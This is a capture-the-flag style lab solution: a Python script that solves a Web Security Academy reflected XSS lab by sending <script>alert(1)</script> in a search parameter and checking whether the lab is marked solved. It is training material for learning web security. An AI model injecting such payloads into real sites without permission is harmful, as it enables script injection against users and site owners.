# Reflected XSS into HTML context with nothing encoded

> This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
> To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

```python
"""
LAB: Reflected XSS into HTML context with nothing encoded
TYPE: Reflected XSS
DESCRIPTION: 
    Sends a standard XSS payload to the target search parameter.
    Verifies success by checking if the lab status updates to 'solved'.
"""

import requests

# --- Configuration ---
BASE_URL = "https://0ae8004e0472c04884dd4c7400980092.web-security-academy.net/"

def run_exploit(url):
    """
    Injects a basic script tag into the search parameter.
    """
    print(f"[*] Target: {url}")
    print("[*] Payload: <script>alert(1)</script>")

    # The payload dictionary allows 'requests' to automatically format
    payload_data = {
        "search": "<script>alert(1)</script>"
    }

    # Send the GET request with the injected parameter
    response = requests.get(url, params=payload_data)

    # Verification: 

    if "Congratulations" in response.text:
        print("[+] SUCCESS: Lab Solved. XSS Executed.")
    else:
        print("[-] FAILED: Payload reflected but lab not marked solved (or patched).")

if __name__ == "__main__":
    run_exploit(BASE_URL)
```
